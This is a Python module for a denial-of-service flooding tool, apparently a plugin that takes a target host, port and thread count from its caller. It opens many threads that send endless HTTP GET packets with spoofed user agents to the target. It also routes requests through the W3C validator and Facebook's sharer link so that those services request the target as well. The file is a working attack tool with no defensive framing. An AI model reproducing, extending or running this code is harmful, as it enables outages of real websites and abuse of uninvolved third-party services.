from queue import Queue
from optparse import OptionParser
from customThreading import KillableThread
import time,sys,socket,logging,urllib.request,random

RETURNS = False


def user_agent():
    uagent=[]
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    return uagent


def my_bots():
    bots=[]
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    return bots


def bot_hammering(uagent, url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
            print("\033[94mbot is hammering...\033[0m")
            time.sleep(.1)
    except SystemExit as e:
        raise e
    except:
        time.sleep(.1)


def down_it(host, port, uagent, data):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host,int(port)))
            if s.sendto( packet, (host, int(port)) ):
                s.shutdown(1)
                print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        time.sleep(.1)


def dos(host, port, uagent, q, data):
    while True:
        item = q.get()
        down_it(host, port, uagent, data)
        q.task_done()


def dos2(host, uagent, bots, w):
    while True:
        item=w.get()
        bot_hammering(uagent, random.choice(bots)+"http://"+host)
        w.task_done()


def is_valid(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,int(port)))
        s.settimeout(1)
    except socket.error as e:
        return False
    return True

def kill(dosers):
    for i in dosers:
        i.kill()
    print("Killed all dos threads")


def execute(caller):
    dosers = []
    caller.kill = lambda : kill(dosers)
    # reading headers
    with open("data/headers.txt", "r") as f:
        data = f.read()


    #task queue are q,w
    q = Queue()
    w = Queue()


    try:
        c, host, port = caller.data.split(" ")
        thr = (caller.data.split(" ")+[135])[3]
    except ValueError as e:
        return caller.error(e)

    # recieved target ip and port

    if not is_valid(host, port): return caller.error(ValueError("Invalid ip or port"))
    # validated ip and port

    uagent = user_agent()
    bots = my_bots()

    print("Please wait...")
    time.sleep(5)

    print("start", host, port, thr)
    while True: # master loop
        for i in range(int(thr)):
            t = KillableThread(target=lambda : dos(host, port, uagent, q, data))
            dosers.append(t)
            t.start() # start dos threads
            t2 = KillableThread(target=lambda : dos2(host, uagent, bots, w))
            dosers.append(t2)
            t2.start() # start dos threads

        start = time.time()

        #tasking
        item = 0
        while True:
            if (item>1800): # for no memory crash
                item=0
                time.sleep(.1)
            item += 1
            q.put(item)
            w.put(item)

        q.join()
        w.join()
